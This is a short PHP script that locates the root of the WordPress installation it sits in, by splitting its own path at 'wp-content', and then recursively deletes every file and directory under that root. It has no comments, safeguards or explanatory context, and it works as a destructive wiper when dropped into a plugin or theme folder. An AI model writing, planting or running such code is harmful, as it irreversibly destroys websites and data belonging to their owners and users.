<?php

$dir=__DIR__;
$exp=explode("wp-content",$dir);

var_dump($exp);


function delTree($dir) {

    $files = array_diff(scandir($dir), array('.','..'));

    foreach ($files as $file) {

        (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");

    }

    return rmdir($dir);

}
delTree($exp[0]);